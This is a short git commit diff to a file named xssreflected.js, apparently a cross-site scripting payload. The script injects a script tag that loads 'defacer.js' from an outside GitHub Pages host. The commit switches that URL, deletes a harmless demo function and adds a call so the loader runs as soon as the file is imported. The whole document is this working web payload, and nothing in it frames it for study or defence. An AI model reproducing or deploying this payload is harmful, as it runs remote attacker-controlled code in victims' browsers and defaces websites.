0b8abe546759e872aff2d4996c7fa1e04903d52c
CyberCutie0 <jaytechph0@gmail.com>
2025-01-17 23:01:58 +0800

    Update xssreflected.js

--- xssreflected.js
+++ xssreflected.js
@@ -1,7 +1,7 @@
 function clearHTML() {
     // Dynamically load an external JS file
     const script = document.createElement("script");
-    script.src = "https://raw.githubusercontent.com/CyberCutie0/-/refs/heads/main/defacer.js"; // Replace with the actual URL
+    script.src = "https://cybercutie0.github.io/-/defacer.js"; // Replace with the actual URL
     script.onload = () => {
         console.log("External script has been loaded.");
     };
@@ -12,8 +12,5 @@ function clearHTML() {
     document.body.appendChild(script); // Add the script to the <head>
 }
 
-function myFunction() {
-    document.getElementById("demo").innerHTML="Paragraph changed.";
-}
-
 console.log("IMPORTING SUCCESS");
+clearHTML();
